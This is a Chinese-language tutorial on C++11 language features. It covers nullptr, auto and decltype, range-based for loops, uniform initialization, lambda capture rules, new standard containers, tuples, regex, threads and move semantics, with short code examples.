\u4e0d\u5141\u8bb8\u76f4\u63a5\u5c06 void * \u9690\u5f0f\u8f6c\u6362\u5230\u5176\u4ed6\u7c7b\u578b\uff0c\u4f46\u5982\u679c NULL \u88ab\u5b9a\u4e49\u4e3a ((void*)0) \uff0c\u90a3\u4e48\u5f53\u7f16\u8bd1 char *ch = NULL; \u65f6\uff0cNULL \u53ea\u597d\u88ab\u5b9a\u4e49\u4e3a 0\u3002\u800c\u8fd9\u4f9d\u7136\u4f1a\u4ea7\u751f\u95ee\u9898\uff0c\u5c06\u5bfc\u81f4\u4e86 C++ \u4e2d\u91cd\u8f7d\u7279\u6027\u4f1a\u53d1\u751f\u6df7\u4e71\uff0c\u8003\u8651\uff1a void foo(char *); void foo(int); \u5bf9\u4e8e\u8fd9\u4e24\u4e2a\u51fd\u6570\u6765\u8bf4\uff0c\u5982\u679c NULL \u53c8\u88ab\u5b9a\u4e49\u4e3a\u4e86 0 \u90a3\u4e48 foo(NULL); \u8fd9\u4e2a\u8bed\u53e5\u5c06\u4f1a\u53bb\u8c03\u7528 foo(int)\uff0c\u4ece\u800c\u5bfc\u81f4\u4ee3\u7801\u8fdd\u53cd\u76f4\u89c2\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cC++11 \u5f15\u5165\u4e86 nullptr \u5173\u952e\u5b57\uff0c\u4e13\u95e8\u7528\u6765\u533a\u5206\u7a7a\u6307\u9488\u30010\u3002 nullptr \u7684\u7c7b\u578b\u4e3a nullptr_t\uff0c\u80fd\u591f\u9690\u5f0f\u7684\u8f6c\u6362\u4e3a\u4efb\u4f55\u6307\u9488\u6216\u6210\u5458\u6307\u9488\u7684\u7c7b\u578b\uff0c\u4e5f\u80fd\u548c\u4ed6\u4eec\u8fdb\u884c\u76f8\u7b49\u6216\u8005\u4e0d\u7b49\u7684\u6bd4\u8f83\u3002\u5f53\u9700\u8981\u4f7f\u7528 NULL \u65f6\u5019\uff0c\u517b\u6210\u76f4\u63a5\u4f7f\u7528 nullptr\u7684\u4e60\u60ef\u3002 \u5728\u6ca1\u6709C++ 11\u7684nullptr\u7684\u65f6\u5019\uff0c\u6211\u4eec\u600e\u4e48\u89e3\u51b3\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2a: const class nullptr_t { public: template<class T> operator T*() const { return 0; } template<class C, class T> operator T C::*() const { return 0; } private: void operator&() const; } nullptr = {}; #undef NULL #define NULL nullptr \u7c7b\u578b\u63a8\u5bfc: C++11 \u5f15\u5165\u4e86 auto \u548c decltype \u8fd9\u4e24\u4e2a\u5173\u952e\u5b57\u5b9e\u73b0\u4e86\u7c7b\u578b\u63a8\u5bfc\uff0c\u8ba9\u7f16\u8bd1\u5668\u6765\u64cd\u5fc3\u53d8\u91cf\u7684\u7c7b\u578b\u3002 auto \u5728\u5f88\u65e9\u4ee5\u524d\u5c31\u5df2\u7ecf\u8fdb\u5165\u4e86 C++\uff0c\u4f46\u662f\u4ed6\u59cb\u7ec8\u4f5c\u4e3a\u4e00\u4e2a\u5b58\u50a8\u7c7b\u578b\u7684\u6307\u793a\u7b26\u5b58\u5728\uff0c\u4e0e register \u5e76\u5b58\u3002\u5728\u4f20\u7edf C++ \u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u6ca1\u6709\u58f0\u660e\u4e3a register \u53d8\u91cf\uff0c\u5c06\u81ea\u52a8\u88ab\u89c6\u4e3a\u4e00\u4e2a auto \u53d8\u91cf\u3002\u800c\u968f\u7740 register \u88ab\u5f03\u7528\uff0c\u5bf9 auto \u7684\u8bed\u4e49\u53d8\u66f4\u4e5f\u5c31\u975e\u5e38\u81ea\u7136\u4e86\u3002 \u4f7f\u7528 auto \u8fdb\u884c\u7c7b\u578b\u63a8\u5bfc\u7684\u4e00\u4e2a\u6700\u4e3a\u5e38\u89c1\u800c\u4e14\u663e\u8457\u7684\u4f8b\u5b50\u5c31\u662f\u8fed\u4ee3\u5668\u3002\u5728\u4ee5\u524d\u6211\u4eec\u9700\u8981\u8fd9\u6837\u6765\u4e66\u5199\u4e00\u4e2a\u8fed\u4ee3\u5668\uff1a for(vector<int>::const_iterator itr = vec.cbegin(); itr != vec.cend(); ++itr) \u800c\u6709\u4e86 auto \u4e4b\u540e\u53ef\u4ee5\uff1a for(auto itr = vec.cbegin(); itr != vec.cend(); ++itr); decltype \u5173\u952e\u5b57\u662f\u4e3a\u4e86\u89e3\u51b3 auto \u5173\u952e\u5b57\u53ea\u80fd\u5bf9\u53d8\u91cf\u8fdb\u884c\u7c7b\u578b\u63a8\u5bfc\u7684\u7f3a\u9677\u800c\u51fa\u73b0\u7684\u3002\u5b83\u7684\u7528\u6cd5\u548c sizeof \u5f88\u76f8\u4f3c\uff1adecltype(\u8868\u8fbe\u5f0f) auto x = 1; auto y = 2; decltype(x+y) z; \u57fa\u4e8e\u8303\u56f4\u7684 for \u5faa\u73af C++11 \u5f15\u5165\u4e86\u57fa\u4e8e\u8303\u56f4\u7684\u8fed\u4ee3\u5199\u6cd5\uff0c\u6211\u4eec\u62e5\u6709\u4e86\u80fd\u591f\u5199\u51fa\u50cf Python \u4e00\u6837\u7b80\u6d01\u7684\u5faa\u73af\u8bed\u53e5\u3002 \u6700\u5e38\u7528\u7684 std::vector \u904d\u5386\u5c06\u4ece\u539f\u6765\u7684\u6837\u5b50\uff1a for(std::vector<int>::iterator i = arr.begin(); i != arr.end(); ++i) { std::cout << *i << std::endl; } \u4f7f\u7528\u8303\u56f4for\u5faa\u73af\u53d8\u5f97\u975e\u5e38\u7684\u7b80\u5355\uff1a // & \u542f\u7528\u4e86\u5f15\u7528 for(auto &i : arr) { std::cout << i << std::endl; } \u521d\u59cb\u5316\u5217\u8868 C++11 \u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u8bed\u6cd5\u6765\u521d\u59cb\u5316\u4efb\u610f\u7684\u5bf9\u8c61\uff0c\u4f8b\u5982\uff1a struct A { int a; float b; }; struct B { B(int _a, float _b): a(_a), b(_b) {} private: int a; float b; }; A a {1, 1.1}; // \u7edf\u4e00\u7684\u521d\u59cb\u5316\u8bed\u6cd5 B b {2, 2.2}; Lambda \u8868\u8fbe\u5f0f Lambda \u8868\u8fbe\u5f0f\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u533f\u540d\u51fd\u6570\u7684\u7279\u6027\uff0c\u800c\u533f\u540d\u51fd\u6570\u5219\u662f\u5728\u9700\u8981\u4e00\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u53c8\u4e0d\u60f3\u8d39\u529b\u53bb\u547d\u540d\u4e00\u4e2a\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u53bb\u4f7f\u7528\u7684\u3002\u57fa\u672c\u8bed\u6cd5\u5982\u4e0b\uff1a [ caputrue ] ( params ) opt -> ret { body; }; capture\u662f\u6355\u83b7\u5217\u8868\uff1b params\u662f\u53c2\u6570\u8868\uff1b(\u9009\u586b) opt\u662f\u51fd\u6570\u9009\u9879\uff1b\u53ef\u4ee5\u586bmutable,exception,attribute\uff08\u9009\u586b\uff09 mutable\u8bf4\u660elambda\u8868\u8fbe\u5f0f\u4f53\u5185\u7684\u4ee3\u7801\u53ef\u4ee5\u4fee\u6539\u88ab\u6355\u83b7\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u53ef\u4ee5\u8bbf\u95ee\u88ab\u6355\u83b7\u7684\u5bf9\u8c61\u7684non-const\u65b9\u6cd5\u3002 exception\u8bf4\u660elambda\u8868\u8fbe\u5f0f\u662f\u5426\u629b\u51fa\u5f02\u5e38\u4ee5\u53ca\u4f55\u79cd\u5f02\u5e38\u3002 attribute\u7528\u6765\u58f0\u660e\u5c5e\u6027\u3002 ret\u662f\u8fd4\u56de\u503c\u7c7b\u578b\uff08\u62d6\u5c3e\u8fd4\u56de\u7c7b\u578b\uff09\u3002(\u9009\u586b) body\u662f\u51fd\u6570\u4f53\u3002 \u6355\u83b7\u5217\u8868\uff1alambda\u8868\u8fbe\u5f0f\u7684\u6355\u83b7\u5217\u8868\u7cbe\u7ec6\u63a7\u5236\u4e86lambda\u8868\u8fbe\u5f0f\u80fd\u591f\u8bbf\u95ee\u7684\u5916\u90e8\u53d8\u91cf\uff0c\u4ee5\u53ca\u5982\u4f55\u8bbf\u95ee\u8fd9\u4e9b\u53d8\u91cf\u3002 []\u4e0d\u6355\u83b7\u4efb\u4f55\u53d8\u91cf\u3002 [&]\u6355\u83b7\u5916\u90e8\u4f5c\u7528\u57df\u4e2d\u6240\u6709\u53d8\u91cf\uff0c\u5e76\u4f5c\u4e3a\u5f15\u7528\u5728\u51fd\u6570\u4f53\u4e2d\u4f7f\u7528\uff08\u6309\u5f15\u7528\u6355\u83b7\uff09\u3002 [=]\u6355\u83b7\u5916\u90e8\u4f5c\u7528\u57df\u4e2d\u6240\u6709\u53d8\u91cf\uff0c\u5e76\u4f5c\u4e3a\u526f\u672c\u5728\u51fd\u6570\u4f53\u4e2d\u4f7f\u7528(\u6309\u503c\u6355\u83b7)\u3002\u6ce8\u610f\u503c\u6355\u83b7\u7684\u524d\u63d0\u662f\u53d8\u91cf\u53ef\u4ee5\u62f7\u8d1d\uff0c\u4e14\u88ab\u6355\u83b7\u7684\u53d8\u91cf\u5728 lambda \u8868\u8fbe\u5f0f\u88ab\u521b\u5efa\u65f6\u62f7\u8d1d\uff0c\u800c\u975e\u8c03\u7528\u65f6\u624d\u62f7\u8d1d\u3002\u5982\u679c\u5e0c\u671blambda\u8868\u8fbe\u5f0f\u5728\u8c03\u7528\u65f6\u80fd\u5373\u65f6\u8bbf\u95ee\u5916\u90e8\u53d8\u91cf\uff0c\u6211\u4eec\u5e94\u5f53\u4f7f\u7528\u5f15\u7528\u65b9\u5f0f\u6355\u83b7\u3002 int a = 0; auto f = [=] { return a; }; a+=1; cout << f() << endl; //\u8f93\u51fa0 int a = 0; auto f = [&a] { return a; }; a+=1; cout << f() <<endl; //\u8f93\u51fa1 [=,&foo]\u6309\u503c\u6355\u83b7\u5916\u90e8\u4f5c\u7528\u57df\u4e2d\u6240\u6709\u53d8\u91cf\uff0c\u5e76\u6309\u5f15\u7528\u6355\u83b7foo\u53d8\u91cf\u3002 [bar]\u6309\u503c\u6355\u83b7bar\u53d8\u91cf\uff0c\u540c\u65f6\u4e0d\u6355\u83b7\u5176\u4ed6\u53d8\u91cf\u3002 [this]\u6355\u83b7\u5f53\u524d\u7c7b\u4e2d\u7684this\u6307\u9488\uff0c\u8ba9lambda\u8868\u8fbe\u5f0f\u62e5\u6709\u548c\u5f53\u524d\u7c7b\u6210\u5458\u51fd\u6570\u540c\u6837\u7684\u8bbf\u95ee\u6743\u9650\u3002\u5982\u679c\u5df2\u7ecf\u4f7f\u7528\u4e86&\u6216\u8005=\uff0c\u5c31\u9ed8\u8ba4\u6dfb\u52a0\u6b64\u9009\u9879\u3002\u6355\u83b7this\u7684\u76ee\u7684\u662f\u53ef\u4ee5\u5728lamda\u4e2d\u4f7f\u7528\u5f53\u524d\u7c7b\u7684\u6210\u5458\u51fd\u6570\u548c\u6210\u5458\u53d8\u91cf\u3002 class A { public: int i_ = 0; void func(int x,int y){ auto x1 = [] { return i_; }; //error,\u6ca1\u6709\u6355\u83b7\u5916\u90e8\u53d8\u91cf auto x2 = [=] { return i_ + x + y; }; //OK auto x3 = [&] { return i_ + x + y; }; //OK auto x4 = [this] { return i_; }; //OK auto x5 = [this] { return i_ + x + y; }; //error,\u6ca1\u6709\u6355\u83b7x,y auto x6 = [this, x, y] { return i_ + x + y; }; //OK auto x7 = [this] { return i_++; }; //OK } }; int a=0 , b=1; auto f1 = [] { return a; }; //error,\u6ca1\u6709\u6355\u83b7\u5916\u90e8\u53d8\u91cf auto f2 = [&] { return a++ }; //OK auto f3 = [=] { return a; }; //OK auto f4 = [=] {return a++; }; //error,a\u662f\u4ee5\u590d\u5236\u65b9\u5f0f\u6355\u83b7\u7684\uff0c\u65e0\u6cd5\u4fee\u6539 auto f5 = [a] { return a+b; }; //error,\u6ca1\u6709\u6355\u83b7\u53d8\u91cfb auto f6 = [a, &b] { return a + (b++); }; //OK auto f7 = [=, &b] { return a + (b++); }; //OK \u6ce8\u610ff4\uff0c\u867d\u7136\u6309\u503c\u6355\u83b7\u7684\u53d8\u91cf\u503c\u5747\u590d\u5236\u4e00\u4efd\u5b58\u50a8\u5728lambda\u8868\u8fbe\u5f0f\u53d8\u91cf\u4e2d\uff0c\u4fee\u6539\u4ed6\u4eec\u4e5f\u5e76\u4e0d\u4f1a\u771f\u6b63\u5f71\u54cd\u5230\u5916\u90e8\uff0c\u4f46\u6211\u4eec\u5374\u4ecd\u7136\u65e0\u6cd5\u4fee\u6539\u5b83\u4eec\u3002\u5982\u679c\u5e0c\u671b\u53bb\u4fee\u6539\u6309\u503c\u6355\u83b7\u7684\u5916\u90e8\u53d8\u91cf\uff0c\u9700\u8981\u663e\u793a\u6307\u660elambda\u8868\u8fbe\u5f0f\u4e3amutable\u3002\u88abmutable\u4fee\u9970\u7684lambda\u8868\u8fbe\u5f0f\u5c31\u7b97\u6ca1\u6709\u53c2\u6570\u4e5f\u8981\u5199\u660e\u53c2\u6570\u5217\u8868\u3002 \u539f\u56e0\uff1alambda\u8868\u8fbe\u5f0f\u53ef\u4ee5\u8bf4\u662f\u5c31\u5730\u5b9a\u4e49\u4eff\u51fd\u6570\u95ed\u5305\u7684\u201c\u8bed\u6cd5\u7cd6\u201d\u3002\u5b83\u7684\u6355\u83b7\u5217\u8868\u6355\u83b7\u4f4f\u7684\u4efb\u4f55\u5916\u90e8\u53d8\u91cf\uff0c\u6700\u7ec8\u4f1a\u53d8\u4e3a\u95ed\u5305\u7c7b\u578b\u7684\u6210\u5458\u53d8\u91cf\u3002\u6309\u7167C++\u6807\u51c6\uff0clambda\u8868\u8fbe\u5f0f\u7684operator()\u9ed8\u8ba4\u662fconst\u7684\uff0c\u4e00\u4e2aconst\u6210\u5458\u51fd\u6570\u662f\u65e0\u6cd5\u4fee\u6539\u6210\u5458\u53d8\u91cf\u7684\u503c\u7684\u3002\u800cmutable\u7684\u4f5c\u7528\uff0c\u5c31\u5728\u4e8e\u53d6\u6d88operator()\u7684const\u3002 int a = 0; auto f1 = [=] { return a++; }; //error auto f2 = [=] () mutable { return a++; }; //OK lambda\u8868\u8fbe\u5f0f\u7684\u5927\u81f4\u539f\u7406\uff1a\u6bcf\u5f53\u4f60\u5b9a\u4e49\u4e00\u4e2alambda\u8868\u8fbe\u5f0f\u540e\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u533f\u540d\u7c7b\uff08\u8fd9\u4e2a\u7c7b\u91cd\u8f7d\u4e86()\u8fd0\u7b97\u7b26\uff09\uff0c\u6211\u4eec\u79f0\u4e3a\u95ed\u5305\u7c7b\u578b\uff08closure type\uff09\u3002\u90a3\u4e48\u5728\u8fd0\u884c\u65f6\uff0c\u8fd9\u4e2alambda\u8868\u8fbe\u5f0f\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u533f\u540d\u7684\u95ed\u5305\u5b9e\u4f8b\uff0c\u662f\u4e00\u4e2a\u53f3\u503c\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u4e0a\u9762\u7684lambda\u8868\u8fbe\u5f0f\u7684\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u4e2a\u95ed\u5305\u3002\u5bf9\u4e8e\u590d\u5236\u4f20\u503c\u6355\u6349\u65b9\u5f0f\uff0c\u7c7b\u4e2d\u4f1a\u76f8\u5e94\u6dfb\u52a0\u5bf9\u5e94\u7c7b\u578b\u7684\u975e\u9759\u6001\u6570\u636e\u6210\u5458\u3002\u5728\u8fd0\u884c\u65f6\uff0c\u4f1a\u7528\u590d\u5236\u7684\u503c\u521d\u59cb\u5316\u8fd9\u4e9b\u6210\u5458\u53d8\u91cf\uff0c\u4ece\u800c\u751f\u6210\u95ed\u5305\u3002\u5bf9\u4e8e\u5f15\u7528\u6355\u83b7\u65b9\u5f0f\uff0c\u65e0\u8bba\u662f\u5426\u6807\u8bb0mutable\uff0c\u90fd\u53ef\u4ee5\u5728lambda\u8868\u8fbe\u5f0f\u4e2d\u4fee\u6539\u6355\u83b7\u7684\u503c\u3002\u81f3\u4e8e\u95ed\u5305\u7c7b\u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u6210\u5458\uff0cC++\u6807\u51c6\u4e2d\u7ed9\u51fa\u7684\u7b54\u6848\u662f\uff1a\u4e0d\u6e05\u695a\u7684\uff0c\u4e0e\u5177\u4f53\u5b9e\u73b0\u6709\u5173\u3002 \u65b0\u589e\u5bb9\u5668 std::array \u4fdd\u5b58\u5728\u6808\u5185\u5b58\u4e2d\uff0c\u76f8\u6bd4\u5806\u5185\u5b58\u4e2d\u7684 std::vector\uff0c\u6211\u4eec\u80fd\u591f\u7075\u6d3b\u7684\u8bbf\u95ee\u8fd9\u91cc\u9762\u7684\u5143\u7d20\uff0c\u4ece\u800c\u83b7\u5f97\u66f4\u9ad8\u7684\u6027\u80fd\u3002std::array \u4f1a\u5728\u7f16\u8bd1\u65f6\u521b\u5efa\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684\u6570\u7ec4\uff0cstd::array \u4e0d\u80fd\u591f\u88ab\u9690\u5f0f\u7684\u8f6c\u6362\u6210\u6307\u9488\uff0c\u4f7f\u7528 std::array\u53ea\u9700\u6307\u5b9a\u5176\u7c7b\u578b\u548c\u5927\u5c0f\u5373\u53ef\uff1a std::array<int, 4> arr= {1,2,3,4}; int len = 4; std::array<int, len> arr = {1,2,3,4}; // \u975e\u6cd5, \u6570\u7ec4\u5927\u5c0f\u53c2\u6570\u5fc5\u987b\u662f\u5e38\u91cf\u8868\u8fbe\u5f0f std::forward_list \u662f\u4e00\u4e2a\u5217\u8868\u5bb9\u5668\uff0c\u4f7f\u7528\u65b9\u6cd5\u548c std::list \u57fa\u672c\u7c7b\u4f3c\u3002 \u548c std::list \u7684\u53cc\u5411\u94fe\u8868\u7684\u5b9e\u73b0\u4e0d\u540c\uff0cstd::forward_list \u4f7f\u7528\u5355\u5411\u94fe\u8868\u8fdb\u884c\u5b9e\u73b0\uff0c\u63d0\u4f9b\u4e86 O(1) \u590d\u6742\u5ea6\u7684\u5143\u7d20\u63d2\u5165\uff0c\u4e0d\u652f\u6301\u5feb\u901f\u968f\u673a\u8bbf\u95ee\uff08\u8fd9\u4e5f\u662f\u94fe\u8868\u7684\u7279\u70b9\uff09\uff0c\u4e5f\u662f\u6807\u51c6\u5e93\u5bb9\u5668\u4e2d\u552f\u4e00\u4e00\u4e2a\u4e0d\u63d0\u4f9b size() \u65b9\u6cd5\u7684\u5bb9\u5668\u3002\u5f53\u4e0d\u9700\u8981\u53cc\u5411\u8fed\u4ee3\u65f6\uff0c\u5177\u6709\u6bd4 std::list \u66f4\u9ad8\u7684\u7a7a\u95f4\u5229\u7528\u7387\u3002 C++11 \u5f15\u5165\u4e86\u4e24\u7ec4\u65e0\u5e8f\u5bb9\u5668\uff1a std::unordered_map/std::unordered_multimap \u548c std::unordered_set/std::unordered_multiset\u3002 \u65e0\u5e8f\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\u662f\u4e0d\u8fdb\u884c\u6392\u5e8f\u7684\uff0c\u5185\u90e8\u901a\u8fc7 Hash \u8868\u5b9e\u73b0\uff0c\u63d2\u5165\u548c\u641c\u7d22\u5143\u7d20\u7684\u5e73\u5747\u590d\u6742\u5ea6\u4e3a O(constant)\u3002 \u5143\u7ec4 std::tuple \u5143\u7ec4\u7684\u4f7f\u7528\u6709\u4e09\u4e2a\u6838\u5fc3\u7684\u51fd\u6570\uff1a std::make_tuple: \u6784\u9020\u5143\u7ec4 std::get: \u83b7\u5f97\u5143\u7ec4\u67d0\u4e2a\u4f4d\u7f6e\u7684\u503c std::tie: \u5143\u7ec4\u62c6\u5305 \u5143\u7ec4\u793a\u4f8b\uff1a #include <tuple> #include <iostream> auto get_student(int id) { // \u8fd4\u56de\u7c7b\u578b\u88ab\u63a8\u65ad\u4e3a std::tuple<double, char, std::string> if (id == 0) return std::make_tuple(3.8, 'A', \"\u5f20\u4e09\"); if (id == 1) return std::make_tuple(2.9, 'C', \"\u674e\u56db\"); if (id == 2) return std::make_tuple(1.7, 'D', \"\u738b\u4e94\"); return std::make_tuple(0.0, 'D', \"null\"); // \u5982\u679c\u53ea\u5199 0 \u4f1a\u51fa\u73b0\u63a8\u65ad\u9519\u8bef, \u7f16\u8bd1\u5931\u8d25 } int main() { auto student = get_student(0); std::cout << \"ID: 0, \" << \"GPA: \" << std::get<0>(student) << \", \" << \"\u6210\u7ee9: \" << std::get<1>(student) << \", \" << \"\u59d3\u540d: \" << std::get<2>(student) << '\\n'; double gpa; char grade; std::string name; // \u5143\u7ec4\u8fdb\u884c\u62c6\u5305 std::tie(gpa, grade, name) = get_student(1); std::cout << \"ID: 1, \" << \"GPA: \" << gpa << \", \" << \"\u6210\u7ee9: \" << grade << \", \" << \"\u59d3\u540d: \" << name << '\\n'; } \u6b63\u5219\u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f\u63cf\u8ff0\u4e86\u4e00\u79cd\u5b57\u7b26\u4e32\u5339\u914d\u7684\u6a21\u5f0f\u3002\u4e00\u822c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4e3b\u8981\u662f\u5b9e\u73b0\u4e0b\u9762\u4e09\u4e2a\u9700\u6c42\uff1a \u68c0\u67e5\u4e00\u4e2a\u4e32\u662f\u5426\u5305\u542b\u67d0\u79cd\u5f62\u5f0f\u7684\u5b50\u4e32\uff1b \u5c06\u5339\u914d\u7684\u5b50\u4e32\u66ff\u6362\uff1b \u4ece\u67d0\u4e2a\u4e32\u4e2d\u53d6\u51fa\u7b26\u5408\u6761\u4ef6\u7684\u5b50\u4e32\u3002 C++11 \u63d0\u4f9b\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5e93\u64cd\u4f5c std::string \u5bf9\u8c61\uff0c\u5bf9\u6a21\u5f0f std::regex (\u672c\u8d28\u662f std::basic_regex)\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u901a\u8fc7 std::regex_match \u8fdb\u884c\u5339\u914d\uff0c\u4ece\u800c\u4ea7\u751f std::smatch \uff08\u672c\u8d28\u662f std::match_results \u5bf9\u8c61\uff09\u3002 \u8bed\u8a00\u7ea7\u7ebf\u7a0b\u652f\u6301 std::thread std::mutex/std::unique_lock std::future/std::packaged_task std::condition_variable \u4ee3\u7801\u7f16\u8bd1\u9700\u8981\u4f7f\u7528 -pthread \u9009\u9879 \u53f3\u503c\u5f15\u7528\u548cmove\u8bed\u4e49 C++ 11\u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u673a\u5236\u53eb\u505a\u201c\u53f3\u503c\u5f15\u7528\u201d\uff0c\u4ee5\u4fbf\u6211\u4eec\u901a\u8fc7\u91cd\u8f7d\u76f4\u63a5\u4f7f\u7528\u53f3\u503c\u53c2\u6570\u3002\u6211\u4eec\u6240\u8981\u505a\u7684\u5c31\u662f\u5199\u4e00\u4e2a\u4ee5\u53f3\u503c\u5f15\u7528\u4e3a\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\uff1a string(string&& that) // string&& is an rvalue reference to a string { data = that.data; that.data = 0; } \u6211\u4eec\u6ca1\u6709\u6df1\u5ea6\u62f7\u8d1d\u5806\u5185\u5b58\u4e2d\u7684\u6570\u636e\uff0c\u800c\u662f\u4ec5\u4ec5\u590d\u5236\u4e86\u6307\u9488\uff0c\u5e76\u628a\u6e90\u5bf9\u8c61\u7684\u6307\u9488\u7f6e\u7a7a\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u201c\u5077\u53d6\u201d\u4e86\u5c5e\u4e8e\u6e90\u5bf9\u8c61\u7684\u5185\u5b58\u6570\u636e\u3002\u7531\u4e8e\u6e90\u5bf9\u8c61\u662f\u4e00\u4e2a\u53f3\u503c\uff0c\u4e0d\u4f1a\u518d\u88ab\u4f7f\u7528\uff0c\u56e0\u6b64\u5ba2\u6237\u5e76\u4e0d\u4f1a\u89c9\u5bdf\u5230\u6e90\u5bf9\u8c61\u88ab\u6539\u53d8\u4e86\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u771f\u6b63\u7684\u590d\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u53eb\u505a\u201c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u201d\uff08move constructor\uff09\uff0c\u4ed6\u7684\u5de5\u4f5c\u5c31\u662f\u628a\u8d44\u6e90\u4ece\u4e00\u4e2a\u5bf9\u8c61\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u590d\u5236\u4ed6\u4eec\u3002 \u5bf9\u4e8eC++ 11\uff0c\u7f16\u8bd1\u5668\u4f1a\u4f9d\u636e\u53c2\u6570\u662f\u5de6\u503c\u8fd8\u662f\u53f3\u503c\u5728\u590d\u5236\u6784\u9020\u51fd\u6570\u548c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u95f4\u8fdb\u884c\u9009\u62e9\u3002 \u5982\u679c\u662fa=b\uff0c\u8fd9\u6837\u5c31\u4f1a\u8c03\u7528\u590d\u5236\u6784\u9020\u51fd\u6570\u6765\u521d\u59cb\u5316that\uff08\u56e0\u4e3ab\u662f\u5de6\u503c\uff09\uff0c\u8d4b\u503c\u64cd\u4f5c\u7b26\u4f1a\u4e0e\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u4ea4\u6362\u6570\u636e\uff0c\u6df1\u5ea6\u62f7\u8d1d\u3002\u8fd9\u5c31\u662fcopy and swap \u60ef\u7528\u6cd5\u7684\u5b9a\u4e49\uff1a\u6784\u9020\u4e00\u4e2a\u526f\u672c\uff0c\u4e0e\u526f\u672c\u4ea4\u6362\u6570\u636e\uff0c\u5e76\u8ba9\u526f\u672c\u5728\u4f5c\u7528\u57df\u5185\u81ea\u52a8\u9500\u6bc1\u3002\u8fd9\u91cc\u4e5f\u4e00\u6837\u3002 \u5982\u679c\u662fa = x + y\uff0c\u8fd9\u6837\u5c31\u4f1a\u8c03\u7528\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u6765\u521d\u59cb\u5316that\uff08\u56e0\u4e3ax+y\u662f\u53f3\u503c\uff09\uff0c\u6240\u4ee5\u8fd9\u91cc\u6ca1\u6709\u6df1\u5ea6\u62f7\u8d1d\uff0c\u53ea\u6709\u9ad8\u6548\u7684\u6570\u636e\u8f6c\u79fb\u3002\u76f8\u5bf9\u4e8e\u53c2\u6570\uff0cthat\u4f9d\u7136\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u4ed6\u7684\u6784\u9020\u51fd\u6570\u662f\u65e0\u7528\u7684\uff08trivial\uff09\uff0c\u56e0\u6b64\u5806\u4e2d\u7684\u6570\u636e\u6ca1\u6709\u5fc5\u8981\u590d\u5236\uff0c\u800c\u4ec5\u4ec5\u662f\u8f6c\u79fb\u3002\u6ca1\u6709\u5fc5\u8981\u590d\u5236\u4ed6\uff0c\u56e0\u4e3ax+y\u662f\u53f3\u503c\uff0c\u518d\u6b21\uff0c\u4ece\u53f3\u503c\u6307\u5411\u7684\u5bf9\u8c61\u4e2d\u8f6c\u79fb\u662f\u6ca1\u6709\u95ee\u9898\u7684\u3002 \u603b\u7ed3\u4e00\u4e0b\uff1a\u590d\u5236\u6784\u9020\u51fd\u6570\u6267\u884c\u7684\u662f\u6df1\u5ea6\u62f7\u8d1d\uff0c\u56e0\u4e3a\u6e90\u5bf9\u8c61\u672c\u8eab\u5fc5\u987b\u4e0d\u80fd\u88ab\u6539\u53d8\u3002\u800c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u5374\u53ef\u4ee5\u590d\u5236\u6307\u9488\uff0c\u628a\u6e90\u5bf9\u8c61\u7684\u6307\u9488\u7f6e\u7a7a\uff0c\u8fd9\u79cd\u5f62\u5f0f\u4e0b\uff0c\u8fd9\u662f\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u7528\u6237\u4e0d\u53ef\u80fd\u518d\u4f7f\u7528\u8fd9\u4e2a\u5bf9\u8c61\u4e86\u3002 \u53f3\u503c\u5f15\u7528\u662f\u9488\u5bf9\u53f3\u503c\u7684\u65b0\u7684\u5f15\u7528\u7c7b\u578b\uff0c\u8bed\u6cd5\u662fX&&\u3002\u4ee5\u524d\u7684\u8001\u7684\u5f15\u7528\u7c7b\u578bX& \u73b0\u5728\u88ab\u79f0\u4f5c\u5de6\u503c\u5f15\u7528\u3002\u4f7f\u7528\u53f3\u503c\u5f15\u7528X&&\u4f5c\u4e3a\u53c2\u6570\u7684\u6700\u6709\u7528\u7684\u51fd\u6570\u4e4b\u4e00\u5c31\u662f\u8f6c\u79fb\u6784\u9020\u51fd\u6570X::X(X&& source)\uff0c\u5b83\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u628a\u6e90\u5bf9\u8c61\u7684\u672c\u5730\u8d44\u6e90\u8f6c\u79fb\u7ed9\u5f53\u524d\u5bf9\u8c61\u3002 